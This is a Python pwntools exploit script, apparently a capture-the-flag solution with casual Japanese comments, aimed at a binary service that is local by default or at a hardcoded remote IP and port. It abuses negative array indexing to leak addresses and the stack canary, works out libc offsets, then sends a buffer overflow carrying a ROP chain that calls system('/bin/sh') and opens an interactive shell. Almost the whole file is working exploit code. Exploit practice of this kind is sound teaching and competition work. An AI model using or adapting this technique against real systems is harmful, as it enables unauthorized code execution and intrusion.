from __future__ import division, print_function
import random
from pwn import *
import argparse
import time


context.log_level = 'error'

parser = argparse.ArgumentParser()
parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host"
        )
parser.add_argument(
        "--port",
        default=3001,
        help="target port"
        )
parser.add_argument(
        '--log',
        action='store_true'
        )
parser.add_argument(
        '--is-gaibu',
        action='store_true'
        )
args = parser.parse_args()


log = args.log
is_gaibu = args.is_gaibu
if is_gaibu:
    host = "35.194.118.87"
    port = 9004
else:
    host = args.host
    port = args.port

def wait_for_attach():
    if not is_gaibu:
        print('attach?')
        raw_input()

def just_u64(x):
    return u64(x.ljust(8, b'\x00'))

def main(diff, diff2):
    r = remote(host, port)

    def recvuntil(x, verbose=True):
        if type(x) == str:
            x = x.encode("ascii")
        s = r.recvuntil(x)
        if log and verbose:
            print(s)
        return s.strip(x)

    def recv(n, verbose=True):
        s = r.recv(n)
        if log and verbose:
            print(s)
        return s

    def recvline(verbose=True):
        s = r.recvline()
        if log and verbose:
            print(s)
        return s.strip(b'\n')

    def sendline(s, verbose=True):
        if type(s) == str:
            s = s.encode("ascii")
        if log and verbose:
            print(s)
        r.sendline(s)

    def send(s, verbose=True):
        if type(s) == str:
            s = s.encode("ascii")
        if log and verbose:
            print(s, end='')
        r.send(s)

    def interactive():
        r.interactive()

    ####################################

    def menu(choice):
        recvuntil(b':')
        sendline(str(choice))

    # receive and send
    def rs(s, new_line=True, r=b': '):
        recvuntil(r)
        #s = str(s)
        if new_line:
            sendline(s)
        else:
            send(s)

    # send `s` after r
    def sa(r, s, new_line=True):
        rs(s, new_line, r)


    # 気合のcanary leakからの
    # bofで優勝？

    rs(str(-0xe40 // 8))
    nazo_addr = int(recvline())
    print("nazo_addr", hex(nazo_addr))
    #canary_addr = nazo_addr - 0x2389d8
    canary_addr = nazo_addr - 0x2389d8 + 0x1000 * diff
    print("canary_addr", hex(canary_addr))

    stack_addr = rs(str(-2))
    stack_addr = int(recvline())
    print("stack", hex(stack_addr))

    array_addr = stack_addr - 0x5f
    print("array_addr", hex(array_addr))

    idx = (canary_addr - array_addr) // 8
    rs(str(idx))
    canary = int(recvline())
    print("canary: ", hex(canary))

    # win 無くて、草。
    rs(str(-0x30//8))
    libc_addr = int(recvline()) - 0x272040 + 0x1000 * diff2
    print("libc_addr:", hex(libc_addr))
    system_addr = libc_addr + 0x50d60
    binsh_addr = libc_addr + 0x1d8698
    pop_rdi = libc_addr + 0x174332
    ret = libc_addr + 0x174333

    # これどうするんやっけおわった
    # 涙...
    payload = [
        pop_rdi,
        binsh_addr,
        ret,
        system_addr
    ]
    payload = b''.join(map(p64, payload))

    rs(p64(0xdeadbeef) * 5 + p64(canary) + p64(0xdeadbeef) + payload)
    #wait_for_attach()
    rs(str(10))
    sendline("echo hoge")
    print(recvline())
        
    interactive()

if is_gaibu:
    main(12, 12)
    #for i in range(-32, 100):
    #    print("diff2=", i)
    #    try:
    #        main(12, i)
    #    except:
    #        print("fail")
    #        continue
    #    break
else:
    main(0, 0)
